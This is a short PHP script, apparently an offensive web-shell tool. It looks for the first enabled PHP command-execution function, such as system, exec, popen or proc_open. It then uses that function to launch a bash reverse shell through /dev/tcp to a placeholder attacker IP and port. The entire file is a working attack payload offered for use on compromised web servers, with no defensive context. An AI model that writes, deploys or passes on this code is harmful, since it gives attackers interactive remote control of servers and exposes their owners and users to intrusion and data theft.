<?php
$dangerous_functions = array(
    'pcntl_alarm', 'pcntl_fork', 'pcntl_waitpid', 'pcntl_wait', 
    'pcntl_wifexited', 'pcntl_wifstopped', 'pcntl_wifsignaled', 
    'pcntl_wifcontinued', 'pcntl_wexitstatus', 'pcntl_wtermsig', 
    'pcntl_wstopsig', 'pcntl_signal', 'pcntl_signal_get_handler', 
    'pcntl_signal_dispatch', 'pcntl_get_last_error', 'pcntl_strerror', 
    'pcntl_sigprocmask', 'pcntl_sigwaitinfo', 'pcntl_sigtimedwait', 
    'pcntl_exec', 'pcntl_getpriority', 'pcntl_setpriority', 
    'pcntl_async_signals', 'error_log', 'system', 'exec', 
    'shell_exec', 'popen', 'proc_open', 'passthru', 
    'link', 'symlink', 'syslog', 'ld', 'mail', 
    'mb_send_mail', 'imap_open', 'imap_mail', 
    'libvirt_connect', 'gnupg_init', 'imagick'
);

// store the first dangerous function found
$found_function = null;

// Loop through dangerous functions and find the first enabled
foreach ($dangerous_functions as $function) {
    if (function_exists($function)) {
        echo $function . " is enabled\n";
        $found_function = $function;
        break; // Stop checking after finding the first enabled function
    }
}

// Prepare the reverse shell command
$reverse_shell_command = "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'";

// If a dangerous function was found, execute the reverse shell
if ($found_function) {
    echo "Executing reverse shell using $found_function\n";
    
    // Execute the reverse shell command using the detected function
    switch ($found_function) {
        case 'system':
        case 'exec':
        case 'shell_exec':
        case 'passthru':
            $found_function($reverse_shell_command);
            break;
        case 'popen':
            // For popen
            $handle = $found_function($reverse_shell_command, 'r');
            if ($handle) {
                fclose($handle);
            }
            break;
        case 'proc_open':
            $descriptor_spec = array(
                0 => array('pipe', 'r'), // stdin
                1 => array('pipe', 'w'), // stdout
                2 => array('pipe', 'w')  // stderr
            );
            $process = $found_function($reverse_shell_command, $descriptor_spec, $pipes);
            if (is_resource($process)) {
                foreach ($pipes as $pipe) {
                    fclose($pipe);
                }
                proc_close($process);
            }
            break;
        default:
            echo "Function $found_function is not handled for reverse shell execution.\n";
    }
} else {
    echo "No dangerous functions found.\n";
}
